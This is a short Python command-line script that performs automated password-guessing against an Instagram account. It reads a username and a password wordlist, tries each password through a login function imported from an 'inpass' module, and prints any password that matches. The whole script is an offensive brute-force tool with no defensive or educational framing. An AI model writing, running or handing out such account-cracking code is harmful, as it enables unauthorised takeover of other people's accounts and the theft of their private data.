import argparse
import time
from inpass import core

def main():
    parser = argparse.ArgumentParser(description='Automated login attempts for Instagram.')
    parser.add_argument('--username', required=True, help='Instagram username')
    parser.add_argument('--password-file', required=True, help='File containing passwords')

    args = parser.parse_args()

    with open(args.password_file, 'r') as file:
        passwords = file.read().splitlines()

    for password in passwords:
        if core.login(args.username, password):
            print(f"Password match: {password}")
            break
        else:
            print(f"Password {password} not matching")
        time.sleep(1)
    else:
        print("All passwords failed.")
